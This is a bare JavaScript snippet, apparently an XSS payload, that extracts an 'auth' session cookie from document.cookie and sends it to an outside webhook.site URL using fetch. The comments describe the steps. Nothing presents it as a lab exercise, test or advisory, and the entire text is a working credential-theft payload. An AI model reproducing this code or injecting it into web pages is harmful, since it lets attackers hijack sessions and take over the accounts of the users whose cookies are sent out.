
// get auth cookie
const authCookie = document.cookie.match(/auth=(.*?);/)[1];

// send to webhook https://webhook.site/dd6f5ee8-093b-4295-8da8-6dc1069e98de/?auth=YOUR_AUTH
fetch(`https://webhook.site/dd6f5ee8-093b-4295-8da8-6dc1069e98de/?auth=${authCookie}`);
